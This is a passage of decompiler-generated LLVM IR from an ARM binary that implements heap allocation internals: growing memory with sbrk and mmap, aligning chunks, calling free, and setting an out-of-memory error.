dec_label_pc_1380c:                               ; preds = %bb157
  store i32 %v2_137fc, i32* %r0.global-to-local, align 4
  %v1_13810 = call i32 @__GI_sbrk(i32 %v2_137fc)
  store i32 %v1_13810, i32* %r0.global-to-local, align 4
  %v3_13814 = icmp eq i32 %v1_13810, -1
  store i32 %v1_13810, i32* @r4, align 4
  br i1 %v3_13814, label %dec_label_pc_13820, label %dec_label_pc_1388c

dec_label_pc_13820:                               ; preds = %dec_label_pc_1380c, %bb157
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %r1.global-to-local, align 4
  %v4_13828 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 64) to i32*), align 4
  store i32 %v4_13828, i32* %r6.global-to-local, align 4
  %v1_1382c = add i32 %v4_13828, 864
  %v2_1382c = inttoptr i32 %v1_1382c to i32*
  %v3_1382c = load i32, i32* %v2_1382c, align 4
  store i32 %v3_1382c, i32* %r3.global-to-local, align 4
  %v1_13830 = urem i32 %v3_1382c, 2
  %v2_13830 = icmp eq i32 %v1_13830, 0
  br i1 %v2_13830, label %.thread33thread-pre-split, label %bb159

bb159:                                            ; preds = %dec_label_pc_13820
  %v1_13834 = load i32, i32* @r8, align 4
  %v2_13834 = load i32, i32* %sb.global-to-local, align 4
  %v3_13834 = add i32 %v2_13834, %v1_13834
  %v2_13838 = load i32, i32* @r5, align 4
  %v3_13838 = add i32 %v3_13834, %v2_13838
  store i32 %v3_13838, i32* %r3.global-to-local, align 4
  %v2_1383c = load i32, i32* %fp.global-to-local, align 4
  %v3_1383c = and i32 %v2_1383c, %v3_13838
  store i32 %v3_1383c, i32* @r5, align 4
  br label %.thread33

.thread33thread-pre-split:                        ; preds = %dec_label_pc_13820
  %v0_13840.pr = load i32, i32* @r5, align 4
  br label %.thread33

.thread33:                                        ; preds = %.thread33thread-pre-split, %bb159
  %v0_13840 = phi i32 [ %v0_13840.pr, %.thread33thread-pre-split ], [ %v3_1383c, %bb159 ]
  %v2_13840 = icmp ugt i32 %v0_13840, 1048575
  br i1 %v2_13840, label %bb161, label %bb160

bb160:                                            ; preds = %.thread33
  store i32 1048576, i32* @r5, align 4
  br label %bb161

bb161:                                            ; preds = %.thread33, %bb160
  %v0_13858 = phi i32 [ %v0_13840, %.thread33 ], [ 1048576, %bb160 ]
  %v1_13848 = load i32, i32* @sl, align 4
  %tmp218 = icmp ugt i32 %v0_13858, %v1_13848
  br i1 %tmp218, label %dec_label_pc_13850, label %dec_label_pc_13ab4

dec_label_pc_13850:                               ; preds = %bb161
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_13858, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_1386c = call i32 @mmap(i32 0, i32 %v0_13858, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_1386c, i32* %r0.global-to-local, align 4
  %v3_13870 = icmp eq i32 %v6_1386c, -1
  %v8_13870 = icmp eq i32 %v6_1386c, -1
  store i32 %v6_1386c, i32* @r4, align 4
  br i1 %v8_13870, label %.thread36, label %bb162

bb162:                                            ; preds = %dec_label_pc_13850
  %v1_13878 = load i32, i32* %r6.global-to-local, align 4
  %v2_13878 = add i32 %v1_13878, 864
  %v3_13878 = inttoptr i32 %v2_13878 to i32*
  %v4_13878 = load i32, i32* %v3_13878, align 4
  %v2_1387c = load i32, i32* @r5, align 4
  %v3_1387c = add i32 %v2_1387c, %v6_1386c
  store i32 %v3_1387c, i32* %r0.global-to-local, align 4
  %v2_13880 = and i32 %v4_13878, -2
  store i32 %v2_13880, i32* %r3.global-to-local, align 4
  store i32 %v2_13880, i32* %v3_13878, align 4
  br label %.thread36

.thread36:                                        ; preds = %dec_label_pc_13850, %bb162
  br i1 %v3_13870, label %dec_label_pc_1388c, label %dec_label_pc_13890

dec_label_pc_1388c:                               ; preds = %.thread36, %dec_label_pc_1380c
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13890

dec_label_pc_13890:                               ; preds = %.thread36, %dec_label_pc_1388c
  %v0_13890 = load i32, i32* @r4, align 4
  %v7_13890 = icmp eq i32 %v0_13890, -1
  br i1 %v7_13890, label %dec_label_pc_13ab4, label %dec_label_pc_13898

dec_label_pc_13898:                               ; preds = %dec_label_pc_13890
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %r2.global-to-local, align 4
  %v4_138a0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 64) to i32*), align 4
  store i32 %v4_138a0, i32* %ip.global-to-local, align 4
  store i32 %v3_137d0, i32* %r2.global-to-local, align 4
  %v1_138a8 = add i32 %v4_138a0, 872
  %v2_138a8 = inttoptr i32 %v1_138a8 to i32*
  %v3_138a8 = load i32, i32* %v2_138a8, align 4
  %v1_138ac = load i32, i32* @r8, align 4
  %v2_138ac = add i32 %v1_138ac, %v3_137d0
  store i32 %v2_138ac, i32* %r1.global-to-local, align 4
  %v0_138b0 = load i32, i32* @r5, align 4
  %v2_138b0 = add i32 %v0_138b0, %v3_138a8
  store i32 %v2_138b0, i32* %r3.global-to-local, align 4
  %v9_138b4 = icmp eq i32 %v0_13890, %v2_138ac
  br i1 %v9_138b4, label %bb163, label %.thread126

.thread126:                                       ; preds = %dec_label_pc_13898
  store i32 %v2_138b0, i32* %v2_138a8, align 4
  br label %dec_label_pc_138d0

bb163:                                            ; preds = %dec_label_pc_13898
  %v1_138b8 = load i32, i32* %r0.global-to-local, align 4
  %v8_138b8 = icmp eq i32 %v1_138b8, -1
  store i32 %v2_138b0, i32* %v2_138a8, align 4
  br i1 %v8_138b8, label %.thread38, label %dec_label_pc_138d0

.thread38:                                        ; preds = %bb163
  %v1_138c0 = load i32, i32* @r5, align 4
  %v2_138c0 = load i32, i32* @r8, align 4
  %v3_138c0 = add i32 %v2_138c0, %v1_138c0
  %v2_138c4 = or i32 %v3_138c0, 1
  store i32 %v2_138c4, i32* %r3.global-to-local, align 4
  %v2_138c8 = load i32, i32* %r2.global-to-local, align 4
  %v3_138c8 = add i32 %v2_138c8, 4
  %v4_138c8 = inttoptr i32 %v3_138c8 to i32*
  store i32 %v2_138c4, i32* %v4_138c8, align 4
  br label %dec_label_pc_13a48

dec_label_pc_138d0:                               ; preds = %bb163, %.thread126
  %v0_138d4.pr = load i32, i32* @r8, align 4
  %v0_138d0 = load i32, i32* %ip.global-to-local, align 4
  %v1_138d0 = add i32 %v0_138d0, 864
  %v2_138d0 = inttoptr i32 %v1_138d0 to i32*
  %v3_138d0 = load i32, i32* %v2_138d0, align 4
  store i32 %v3_138d0, i32* %r2.global-to-local, align 4
  %v2_138d4 = icmp eq i32 %v0_138d4.pr, 0
  br i1 %v2_138d4, label %.thread41, label %.thread40

.thread41:                                        ; preds = %dec_label_pc_138d0
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread44

.thread40:                                        ; preds = %dec_label_pc_138d0
  %v2_138dc = urem i32 %v3_138d0, 2
  store i32 %v2_138dc, i32* %r3.global-to-local, align 4
  %v2_138e0 = icmp eq i32 %v2_138dc, 0
  br i1 %v2_138e0, label %.thread44, label %dec_label_pc_138e8

dec_label_pc_138e8:                               ; preds = %.thread40
  %v0_138e8 = load i32, i32* @r4, align 4
  %v1_138e8 = load i32, i32* %r1.global-to-local, align 4
  %v3_138e8 = icmp ult i32 %v0_138e8, %v1_138e8
  br i1 %v3_138e8, label %bb164, label %.thread44

bb164:                                            ; preds = %dec_label_pc_138e8
  %v2_138ec = and i32 %v3_138d0, -2
  store i32 %v2_138ec, i32* %r3.global-to-local, align 4
  store i32 %v2_138ec, i32* %v2_138d0, align 4
  br label %.thread44

.thread44:                                        ; preds = %dec_label_pc_138e8, %.thread41, %.thread40, %bb164
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %ip.global-to-local, align 4
  %v4_138fc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 64) to i32*), align 4
  store i32 %v4_138fc, i32* @r7, align 4
  %v1_13900 = add i32 %v4_138fc, 864
  %v2_13900 = inttoptr i32 %v1_13900 to i32*
  %v3_13900 = load i32, i32* %v2_13900, align 4
  store i32 %v3_13900, i32* %r3.global-to-local, align 4
  %v1_13904 = urem i32 %v3_13900, 2
  store i32 %v1_13904, i32* @r6, align 4
  %v2_13904 = icmp eq i32 %v1_13904, 0
  br i1 %v2_13904, label %dec_label_pc_13998, label %dec_label_pc_1390c

dec_label_pc_1390c:                               ; preds = %.thread44
  %v0_1390c = load i32, i32* @r8, align 4
  %v2_1390c = icmp eq i32 %v0_1390c, 0
  br i1 %v2_1390c, label %.thread47, label %bb165

bb165:                                            ; preds = %dec_label_pc_1390c
  %v2_13910 = add i32 %v4_138fc, 872
  %v3_13910 = inttoptr i32 %v2_13910 to i32*
  %v4_13910 = load i32, i32* %v3_13910, align 4
  store i32 %v4_13910, i32* %r2.global-to-local, align 4
  %v1_13914 = load i32, i32* %r1.global-to-local, align 4
  %v2_13914 = load i32, i32* @r4, align 4
  %v3_13914 = sub i32 %v2_13914, %v1_13914
  %v3_13918 = add i32 %v3_13914, %v4_13910
  store i32 %v3_13918, i32* %r3.global-to-local, align 4
  store i32 %v3_13918, i32* %v3_13910, align 4
  br label %.thread47

.thread47:                                        ; preds = %dec_label_pc_1390c, %bb165
  %v0_13920 = load i32, i32* @r4, align 4
  %v1_13920 = urem i32 %v0_13920, 8
  store i32 %v1_13920, i32* %r3.global-to-local, align 4
  %v2_13920 = icmp eq i32 %v1_13920, 0
  br i1 %v2_13920, label %.thread48, label %bb166

bb166:                                            ; preds = %.thread47
  %v2_13924 = sub nsw i32 8, %v1_13920
  store i32 %v2_13924, i32* %r3.global-to-local, align 4
  %v3_13928 = add i32 %v2_13924, %v0_13920
  store i32 %v3_13928, i32* @r7, align 4
  br label %.thread48

.thread48:                                        ; preds = %.thread47, %bb166
  %v0_13930 = phi i32 [ 0, %.thread47 ], [ %v2_13924, %bb166 ]
  %v1_1392c = load i32, i32* @r5, align 4
  %v2_1392c = add i32 %v1_1392c, %v0_13920
  store i32 %v2_1392c, i32* @r6, align 4
  %v1_13930 = load i32, i32* @r8, align 4
  %v2_13930 = add i32 %v2_1392c, %v0_13930
  %v2_13934 = add i32 %v2_13930, %v1_13930
  store i32 %v2_13934, i32* %r1.global-to-local, align 4
  %v1_13938 = load i32, i32* %sb.global-to-local, align 4
  %v2_13938 = add i32 %v1_13938, %v2_13934
  %v1_1393c = load i32, i32* %fp.global-to-local, align 4
  %v2_1393c = and i32 %v1_1393c, %v2_13938
  store i32 %v2_1393c, i32* %r2.global-to-local, align 4
  %v2_13940 = sub i32 0, %v2_1392c
  store i32 %v2_13940, i32* %r3.global-to-local, align 4
  %v2_13944 = sub i32 %v2_1393c, %v2_1392c
  store i32 %v2_13944, i32* @r5, align 4
  store i32 %v2_13944, i32* %r0.global-to-local, align 4
  br i1 %v2_13920, label %bb167, label %bb168

bb167:                                            ; preds = %.thread48
  store i32 %v0_13920, i32* @r7, align 4
  br label %bb168

bb168:                                            ; preds = %.thread48, %bb167
  %v1_13950 = call i32 @__GI_sbrk(i32 %v2_13944)
  store i32 %v1_13950, i32* %r0.global-to-local, align 4
  %v3_13954 = icmp eq i32 %v1_13950, -1
  br i1 %v3_13954, label %dec_label_pc_1395c, label %dec_label_pc_1396c

dec_label_pc_1395c:                               ; preds = %bb168
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_13960 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_13960, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_139c4

dec_label_pc_1396c:                               ; preds = %bb168
  %v1_1396c = load i32, i32* @r4, align 4
  %v3_1396c = icmp ult i32 %v1_13950, %v1_1396c
  br i1 %v3_1396c, label %dec_label_pc_13974, label %dec_label_pc_139c4

dec_label_pc_13974:                               ; preds = %dec_label_pc_1396c
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %r0.global-to-local, align 4
  %v4_1397c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 64) to i32*), align 4
  store i32 %v4_1397c, i32* %r2.global-to-local, align 4
  %v1_13980 = add i32 %v4_1397c, 864
  %v2_13980 = inttoptr i32 %v1_13980 to i32*
  %v3_13980 = load i32, i32* %v2_13980, align 4
  %v0_13984 = load i32, i32* @r6, align 4
  store i32 %v0_13984, i32* %r0.global-to-local, align 4
  %v1_13988 = and i32 %v3_13980, -2
  store i32 %v1_13988, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_13988, i32* %v2_13980, align 4
  br label %dec_label_pc_139c4

dec_label_pc_13998:                               ; preds = %.thread44
  %v0_13998 = load i32, i32* %r0.global-to-local, align 4
  %v3_13998 = icmp eq i32 %v0_13998, -1
  br i1 %v3_13998, label %dec_label_pc_139a0, label %dec_label_pc_139bc

dec_label_pc_139a0:                               ; preds = %dec_label_pc_13998
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_139a4 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_139a4, i32* %r0.global-to-local, align 4
  %v0_139a8 = load i32, i32* @r7, align 4
  %v1_139a8 = add i32 %v0_139a8, 872
  %v2_139a8 = inttoptr i32 %v1_139a8 to i32*
  %v3_139a8 = load i32, i32* %v2_139a8, align 4
  store i32 %v3_139a8, i32* %r2.global-to-local, align 4
  %v0_139ac = load i32, i32* @r4, align 4
  %v0_139b0 = load i32, i32* @r5, align 4
  %v2_139ac = add i32 %v3_139a8, %v1_139a4
  %v2_139b0 = sub i32 %v2_139ac, %v0_139ac
  %v2_139b4 = sub i32 %v2_139b0, %v0_139b0
  store i32 %v2_139b4, i32* %r3.global-to-local, align 4
  store i32 %v2_139b4, i32* %v2_139a8, align 4
  %v0_139c0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_139bc

dec_label_pc_139bc:                               ; preds = %dec_label_pc_13998, %dec_label_pc_139a0
  %v0_139c0 = phi i32 [ 0, %dec_label_pc_13998 ], [ %v0_139c0.pre, %dec_label_pc_139a0 ]
  %v0_139bc = load i32, i32* @r4, align 4
  store i32 %v0_139bc, i32* @r7, align 4
  store i32 %v0_139c0, i32* @r5, align 4
  br label %dec_label_pc_139c4

dec_label_pc_139c4:                               ; preds = %dec_label_pc_1396c, %dec_label_pc_13974, %dec_label_pc_1395c, %dec_label_pc_139bc
  %v0_139c4 = load i32, i32* %r0.global-to-local, align 4
  %v7_139c4 = icmp eq i32 %v0_139c4, -1
  br i1 %v7_139c4, label %dec_label_pc_13a48, label %dec_label_pc_139cc

dec_label_pc_139cc:                               ; preds = %dec_label_pc_139c4
  %v1_139cc = load i32, i32* @r5, align 4
  %v2_139cc = add i32 %v1_139cc, %v0_139c4
  %v0_139d0 = load i32, i32* @r7, align 4
  %v2_139d0 = sub i32 %v2_139cc, %v0_139d0
  %v1_139d4 = or i32 %v2_139d0, 1
  %v2_139d8 = add i32 %v0_139d0, 4
  %v3_139d8 = inttoptr i32 %v2_139d8 to i32*
  store i32 %v1_139d4, i32* %v3_139d8, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_139e4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 64) to i32*), align 4
  store i32 %v4_139e4, i32* @r6, align 4
  %v1_139e8 = add i32 %v4_139e4, 872
  %v2_139e8 = inttoptr i32 %v1_139e8 to i32*
  %v3_139e8 = load i32, i32* %v2_139e8, align 4
  %v0_139ec = load i32, i32* @r8, align 4
  %v2_139ec = icmp eq i32 %v0_139ec, 0
  %v0_139f0 = load i32, i32* @r5, align 4
  %v2_139f0 = add i32 %v0_139f0, %v3_139e8
  store i32 %v2_139f0, i32* %r3.global-to-local, align 4
  store i32 %v2_139f0, i32* %v2_139e8, align 4
  %v0_139f8 = load i32, i32* @r7, align 4
  %v1_139f8 = load i32, i32* @r6, align 4
  %v2_139f8 = add i32 %v1_139f8, 44
  %v3_139f8 = inttoptr i32 %v2_139f8 to i32*
  store i32 %v0_139f8, i32* %v3_139f8, align 4
  br i1 %v2_139ec, label %dec_label_pc_13a48, label %dec_label_pc_13a00

dec_label_pc_13a00:                               ; preds = %dec_label_pc_139cc
  %v0_13a04 = load i32, i32* @r8, align 4
  %v1_13a04 = add i32 %v0_13a04, -12
  %v1_13a08 = and i32 %v1_13a04, -8
  store i32 %v3_137d0, i32* %ip.global-to-local, align 4
  %v2_13a10 = add i32 %v1_13a08, %v3_137d0
  store i32 %v2_13a10, i32* %r1.global-to-local, align 4
  %v2_13a14 = icmp ugt i32 %v1_13a08, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_13a1c = or i32 %v1_13a08, 1
  store i32 %v1_13a1c, i32* %r3.global-to-local, align 4
  store i32 %v1_13a1c, i32* %v2_137dc, align 4
  %v0_13a24 = load i32, i32* %r2.global-to-local, align 4
  %v1_13a24 = load i32, i32* %r1.global-to-local, align 4
  %v2_13a24 = add i32 %v1_13a24, 8
  %v3_13a24 = inttoptr i32 %v2_13a24 to i32*
  store i32 %v0_13a24, i32* %v3_13a24, align 4
  %v0_13a28 = load i32, i32* %r2.global-to-local, align 4
  %v1_13a28 = load i32, i32* %r1.global-to-local, align 4
  %v2_13a28 = add i32 %v1_13a28, 4
  %v3_13a28 = inttoptr i32 %v2_13a28 to i32*
  store i32 %v0_13a28, i32* %v3_13a28, align 4
  br i1 %v2_13a14, label %dec_label_pc_13a30, label %dec_label_pc_13a48

dec_label_pc_13a30:                               ; preds = %dec_label_pc_13a00
  %v0_13a30 = load i32, i32* @r6, align 4
  %v1_13a30 = add i32 %v0_13a30, 836
  %v2_13a30 = inttoptr i32 %v1_13a30 to i32*
  %v3_13a30 = load i32, i32* %v2_13a30, align 4
  store i32 %v3_13a30, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_13a38 = load i32, i32* %ip.global-to-local, align 4
  %v1_13a38 = add i32 %v0_13a38, 8
  store i32 %v1_13a38, i32* @r0, align 4
  store i32 -1, i32* %v2_13a30, align 4
  %v0_13a40 = call i32 @free()
  store i32 %v0_13a40, i32* %r0.global-to-local, align 4
  %v0_13a44 = load i32, i32* @r4, align 4
  %v1_13a44 = load i32, i32* @r6, align 4
  %v2_13a44 = add i32 %v1_13a44, 836
  %v3_13a44 = inttoptr i32 %v2_13a44 to i32*
  store i32 %v0_13a44, i32* %v3_13a44, align 4
  br label %dec_label_pc_13a48

dec_label_pc_13a48:                               ; preds = %.thread38, %dec_label_pc_13a00, %dec_label_pc_139cc, %dec_label_pc_139c4, %dec_label_pc_13a30
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %r0.global-to-local, align 4
  %v4_13a50 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 64) to i32*), align 4
  store i32 %v4_13a50, i32* %lr.global-to-local, align 4
  %v1_13a54 = add i32 %v4_13a50, 872
  store i32 %v1_13a54, i32* %r1.global-to-local, align 4
  %v1_13a58 = inttoptr i32 %v1_13a54 to i32*
  %v2_13a58 = load i32, i32* %v1_13a58, align 4
  store i32 %v2_13a58, i32* %r1.global-to-local, align 4
  %v3_13a58 = add i32 %v4_13a50, 876
  %v4_13a58 = inttoptr i32 %v3_13a58 to i32*
  %v5_13a58 = load i32, i32* %v4_13a58, align 4
  store i32 %v5_13a58, i32* %r3.global-to-local, align 4
  %v1_13a60 = add i32 %v4_13a50, 868
  %v2_13a60 = inttoptr i32 %v1_13a60 to i32*
  %v3_13a60 = load i32, i32* %v2_13a60, align 4
  store i32 %v3_13a60, i32* %r3.global-to-local, align 4
  %v1_13a64 = add i32 %v4_13a50, 884
  %v2_13a64 = inttoptr i32 %v1_13a64 to i32*
  %v3_13a64 = load i32, i32* %v2_13a64, align 4
  store i32 %v3_13a64, i32* %r2.global-to-local, align 4
  %v2_13a68 = add i32 %v3_13a60, %v2_13a58
  store i32 %v2_13a68, i32* %r3.global-to-local, align 4
  %tmp219 = icmp ugt i32 %v2_13a58, %v5_13a58
  br i1 %tmp219, label %bb169, label %bb170

bb169:                                            ; preds = %dec_label_pc_13a48
  store i32 %v2_13a58, i32* %v4_13a58, align 4
  %v0_13a70.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_13a70.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb170

bb170:                                            ; preds = %dec_label_pc_13a48, %bb169
  %v1_13a70 = phi i32 [ %v3_13a64, %dec_label_pc_13a48 ], [ %v1_13a70.pre, %bb169 ]
  %v4_13a74 = phi i32 [ %v2_13a68, %dec_label_pc_13a48 ], [ %v0_13a70.pre, %bb169 ]
  %tmp220 = icmp ugt i32 %v4_13a74, %v1_13a70
  br i1 %tmp220, label %bb171, label %bb172

bb171:                                            ; preds = %bb170
  %v5_13a74 = load i32, i32* %lr.global-to-local, align 4
  %v6_13a74 = add i32 %v5_13a74, 884
  %v7_13a74 = inttoptr i32 %v6_13a74 to i32*
  store i32 %v4_13a74, i32* %v7_13a74, align 4
  br label %bb172

bb172:                                            ; preds = %bb170, %bb171
  %v0_13a78 = load i32, i32* %lr.global-to-local, align 4
  %v1_13a78 = add i32 %v0_13a78, 44
  %v2_13a78 = inttoptr i32 %v1_13a78 to i32*
  %v3_13a78 = load i32, i32* %v2_13a78, align 4
  store i32 %v3_13a78, i32* %ip.global-to-local, align 4
  %v1_13a7c = add i32 %v3_13a78, 4
  %v2_13a7c = inttoptr i32 %v1_13a7c to i32*
  %v3_13a7c = load i32, i32* %v2_13a7c, align 4
  store i32 %v1_13690, i32* %r1.global-to-local, align 4
  %v1_13a84 = and i32 %v3_13a7c, -4
  store i32 %v1_13a84, i32* %r3.global-to-local, align 4
  %v3_13a88 = icmp ult i32 %v1_13a84, %v1_13690
  br i1 %v3_13a88, label %dec_label_pc_13ab4, label %dec_label_pc_13a90

dec_label_pc_13a90:                               ; preds = %bb172
  %v0_13a90 = load i32, i32* @sl, align 4
  %v2_13a90 = sub i32 %v1_13a84, %v0_13a90
  %v2_13a94 = add i32 %v0_13a90, %v3_13a78
  store i32 %v2_13a94, i32* %r1.global-to-local, align 4
  %v1_13a98 = or i32 %v2_13a90, 1
  store i32 %v1_13a98, i32* %r3.global-to-local, align 4
  %v1_13a9c = or i32 %v0_13a90, 1
  store i32 %v1_13a9c, i32* %r2.global-to-local, align 4
  %v1_13aa0 = add i32 %v3_13a78, 8
  store i32 %v1_13aa0, i32* %r0.global-to-local, align 4
  store i32 %v1_13a9c, i32* %v2_13a7c, align 4
  %v0_13aa8 = load i32, i32* %r1.global-to-local, align 4
  %v1_13aa8 = load i32, i32* %lr.global-to-local, align 4
  %v2_13aa8 = add i32 %v1_13aa8, 44
  %v3_13aa8 = inttoptr i32 %v2_13aa8 to i32*
  store i32 %v0_13aa8, i32* %v3_13aa8, align 4
  %v0_13aac = load i32, i32* %r3.global-to-local, align 4
  %v1_13aac = load i32, i32* %r1.global-to-local, align 4
  %v2_13aac = add i32 %v1_13aac, 4
  %v3_13aac = inttoptr i32 %v2_13aac to i32*
  store i32 %v0_13aac, i32* %v3_13aac, align 4
  br label %dec_label_pc_13acc

dec_label_pc_13ab4:                               ; preds = %bb161, %bb172, %dec_label_pc_13890
  store i32 62884, i32* %r3.global-to-local, align 4
  %v0_13ab8 = call i32 @__aeabi_read_tp()
  %v3_13abc = load i16, i16* @global_var_23068.362, align 2
  %v4_13abc = sext i16 %v3_13abc to i32
  store i32 %v4_13abc, i32* %r3.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_13ac4 = add i32 %v4_13abc, %v0_13ab8
  %v4_13ac4 = inttoptr i32 %v3_13ac4 to i32*
  store i32 12, i32* %v4_13ac4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13acc

dec_label_pc_13acc:                               ; preds = %bb155, %bb154, %dec_label_pc_13a90, %dec_label_pc_136d8, %dec_label_pc_13ab4
  %v0_13acc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13acc, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13ad0

dec_label_pc_13ad0:                               ; preds = %.thread5, %dec_label_pc_136a4, %.thread125, %dec_label_pc_13514, %dec_label_pc_13508, %dec_label_pc_13370, %dec_label_pc_132f4, %dec_label_pc_13acc
  store i32 %v2_13214, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %r2.global-to-local, align 4
  %v4_13ae0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 44) to i32*), align 4
  store i32 %v4_13ae0, i32* @ip, align 4
  store i32 80620, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13ae0)
  br label %dec_label_pc_13aec

dec_label_pc_13aec:                               ; preds = %dec_label_pc_1324c, %dec_label_pc_13ad0
  %v0_13aec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13aec, i32* %r0.global-to-local, align 4
  store i32 %v3_131e8, i32* @r4, align 4
  store i32 %v6_131e8, i32* @r5, align 4
  store i32 %v9_131e8, i32* @r6, align 4
  store i32 %v12_131e8, i32* @r7, align 4
  store i32 %v15_131e8, i32* @r8, align 4
  store i32 %v18_131e8, i32* @sb, align 4
  store i32 %v21_131e8, i32* @sl, align 4
  store i32 %v24_131e8, i32* @fp, align 4
  store i32 %v27_131e8, i32* @lr, align 4
  ret i32 %v0_13aec

; uselistorder directives
  uselistorder i32 %v0_13a90, { 1, 0, 2 }
  uselistorder i32 %v3_13a78, { 1, 0, 2, 3 }
  uselistorder i32 %v4_13a74, { 1, 0 }
  uselistorder i32 %v2_13a58, { 2, 0, 1, 3 }
  uselistorder i32 %v4_13a50, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_13a08, { 1, 2, 0 }
  uselistorder i32 %v0_139d0, { 1, 0 }
  uselistorder i32 %v0_139c4, { 1, 0 }
  uselistorder i32 %v2_139b4, { 1, 0 }
  uselistorder i32 %v2_13944, { 2, 1, 0 }
  uselistorder i32 %v2_1392c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_13924, { 1, 0, 2 }
  uselistorder i32 %v1_13920, { 2, 1, 0 }
  uselistorder i32 %v0_13920, { 3, 1, 2, 0 }
  uselistorder i32 %v1_13904, { 1, 0 }
  uselistorder i32 %v2_138dc, { 1, 0 }
  uselistorder i32 %v3_138d0, { 1, 0, 2 }
  uselistorder i32 %v2_138b0, { 1, 0, 2 }
  uselistorder i32* %v2_138a8, { 1, 0, 2 }
  uselistorder i32 %v0_13890, { 1, 0 }
  uselistorder i32 %v6_1386c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_13858, { 2, 1, 0 }
  uselistorder i32 %v0_13840, { 1, 0 }
  uselistorder i32 %v2_137fc, { 1, 0, 2, 3 }
  uselistorder i32 %v1_137f8, { 1, 0 }
  uselistorder i32 %v3_137d0, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_137b0, { 1, 0, 2 }
  uselistorder i32 %v2_13798, { 1, 2, 0, 3 }
  uselistorder i32 %v1_13740, { 2, 1, 0 }
  uselistorder i32 %v6_13734, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_13710, { 2, 1, 0, 3 }
  uselistorder i32 %v3_136d0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_13690, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_13688, { 1, 0, 2, 3 }
  uselistorder i32 %v4_13684, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_13670, { 1, 0 }
  uselistorder i32 %v7_13630, { 1, 0 }
  uselistorder i32 %v4_13630, { 1, 0 }
  uselistorder i32 %v0_13600, { 1, 0 }
  uselistorder i32 %v2_135d4, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_135d058, { 1, 0 }
  uselistorder i32 %v1_1359c, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_13584., { 1, 2, 0 }
  uselistorder i32 %v0_1358c, { 0, 1, 3, 2 }
  uselistorder i32 %v1_1358c, { 1, 0 }
  uselistorder i32 %v3_1356c, { 1, 0 }
  uselistorder i32 %v4_13568, { 1, 0, 2 }
  uselistorder i32 %v1_134d8, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_13530, { 1, 0 }
  uselistorder i32 %v1_13514, { 1, 0 }
  uselistorder i32 %v1_133b4, { 1, 0 }
  uselistorder i32 %v0_134f4, { 2, 0, 1, 3 }
  uselistorder i32 %v3_134bc, { 2, 0, 1, 3 }
  uselistorder i32 %v0_13550.pre, { 1, 2, 0 }
  uselistorder i32 %v0_13498, { 2, 1, 0 }
  uselistorder i32 %v3_1348c, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_133ac, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_13454, { 1, 0 }
  uselistorder i32 %v3_13448, { 1, 0 }
  uselistorder i32 %v0_13454, { 1, 0 }
  uselistorder i32 %v3_1342c, { 0, 2, 3, 1 }
